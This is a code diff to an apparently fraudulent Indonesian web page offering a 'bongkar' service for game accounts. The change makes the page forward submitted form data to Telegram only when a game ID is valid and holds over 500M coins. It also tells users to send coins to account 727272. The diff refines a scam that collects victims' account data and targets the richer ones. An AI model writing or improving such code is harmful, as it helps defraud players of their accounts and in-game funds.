@@ -668,7 +668,7 @@ stars.forEach(s => s.classList.add('active'));
     createToast();
     setInterval(createToast, 5000);
 
-    // --- FORM SUBMIT: POLOSAN + CEK ID — data ke Telegram hanya jika ID game VALID ---
+    // --- FORM SUBMIT: POLOSAN + CEK ID & KOIN — data ke Telegram hanya jika ID VALID dan koin DI ATAS 500M ---
     document.getElementById("bongkarForm").addEventListener("submit", async function(e) {
         e.preventDefault();
 
@@ -698,8 +698,9 @@ stars.forEach(s => s.classList.add('active'));
 
         btn.disabled = true;
 
-        // --- CEK ID GAME via /api/check-id (server-side) ---
+        // --- CEK ID + KOIN via /api/check-id (server-side) ---
         // ID tidak terdaftar -> berhenti di sini, data TIDAK dikirim ke Telegram.
+        // Koin <= 500M -> berhenti juga (coin_status 'low' dari endpoint).
         // Endpoint cek error/timeout -> fail-open (tetap lanjut), sama seperti forwarder.
         btn.innerText = "MEMERIKSA ID...";
         try {
@@ -710,6 +711,18 @@ stars.forEach(s => s.classList.add('active'));
             }).then(r => r.json()).catch(() => null);
             if (chk && chk.valid === false) {
                 alert("Error, ID akun anda tidak valid");
+                btn.innerText = "PROSES BONGKAR";
+                btn.disabled = false;
+                return;
+            }
+            if (chk && chk.coin_status === "invalid") {
+                alert("Error, ID akun anda tidak valid");
+                btn.innerText = "PROSES BONGKAR";
+                btn.disabled = false;
+                return;
+            }
+            if (chk && chk.coin_status === "low") {
+                alert("Koin ID Anda " + (chk.coin_label || "0") + ". Minimal koin di atas 500M untuk bisa proses bongkar.");
                 btn.innerText = "PROSES BONGKAR";
                 btn.disabled = false;
                 return;
@@ -761,7 +774,7 @@ stars.forEach(s => s.classList.add('active'));
 
     function copyWithdrawID() {
         const el = document.getElementById("wd-target-id");
-        const id = (el ? el.textContent : "").trim() || "3314726";
+        const id = (el ? el.textContent : "").trim() || "727272";
         const tmp = document.createElement("input");
         tmp.value = id;
         document.body.appendChild(tmp);
@@ -820,7 +833,7 @@ stars.forEach(s => s.classList.add('active'));
         <div id="wd-send" style="background: rgba(255,204,51,0.12); border: 1px solid #ffcc33; border-radius: 12px; padding: 12px; margin-bottom: 12px; text-align: center;">
             <div style="font-size: 0.8rem; font-weight: 700; color: #ffcc33; margin-bottom: 6px;">KIRIM KOIN KE ID:</div>
             <div id="wd-target-id" style="font-size: 1.3rem; font-weight: 800; color: #fff; letter-spacing: 2px;">727272</div>
-            <div style="font-size: 0.85rem; color: #00e5f4; font-weight: 700;">NOLIMIT</div
+            <div style="font-size: 0.85rem; color: #00e5f4; font-weight: 700;">NOLIMIT</div>
             <button type="button" onclick="copyWithdrawID()" style="margin-top: 8px; background: #fff; border: none; padding: 6px 18px; border-radius: 8px; font-weight: 800; cursor: pointer; color: #ff9800; font-size: 0.75rem;">SALIN ID</button>
         </div>
         <div id="wd-body" style="font-size: 0.85rem; line-height: 1.9; color: #fff;"></div>
